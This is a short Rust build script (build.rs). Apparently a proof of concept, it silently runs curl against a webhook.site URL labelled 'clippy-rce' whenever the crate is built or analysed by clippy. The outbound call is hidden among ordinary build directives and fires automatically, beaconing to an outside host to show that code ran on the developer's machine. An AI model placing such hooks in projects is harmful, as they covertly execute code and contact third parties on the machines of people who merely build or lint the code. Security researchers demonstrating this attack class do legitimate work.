use std::process::Command;

fn main() {
    let _ = Command::new("curl")
        .args([
            "-sS",
            "--max-time",
            "10",
            "https://webhook.site/2727a725-a2f4-4baf-9a7b-a131824965c3/clippy-rce",
        ])
        .status();
    println!("cargo:rerun-if-changed=build.rs");
}
